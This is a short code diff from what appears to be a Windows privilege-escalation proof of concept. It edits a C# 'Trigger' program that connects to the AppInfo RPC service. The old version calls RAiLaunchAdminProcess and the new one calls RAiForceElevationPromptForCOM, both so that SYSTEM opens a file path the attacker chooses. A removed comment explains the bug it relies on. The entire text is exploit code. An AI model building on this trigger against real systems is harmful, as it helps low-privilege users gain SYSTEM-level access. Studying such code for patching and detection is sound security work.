@@ -18,14 +18,11 @@ namespace Trigger
                     using (var client = new Client())
                     {
                         client.Connect();
-                        Struct_0 s = new Struct_0();
-                        NdrUInt3264 o = new NdrUInt3264();
-                        Struct_2 p = new Struct_2();
-                        int p10 = 0;
-
-                        // The input parameters dont really matter besides from the first one
-                        // the process is never created as its prevented for low priv users but CreateFileW is called on args[0] as SYSTEM
-                        client.RAiLaunchAdminProcess(args[0], "", 0x01, 0x00000400, @"C:\", @"WinSta0\Default", s, o, 0, out p, out p10);
+                        
+                        NdrUInt3264 fist_input = new NdrUInt3264();
+                        Guid seccond = new Guid();
+                        client.RAiForceElevationPromptForCOM(fist_input, 0, 0, 0, "", seccond, "", "", "", args[0], 0);
+                        
 
                         Console.WriteLine("[*] Done.");
 
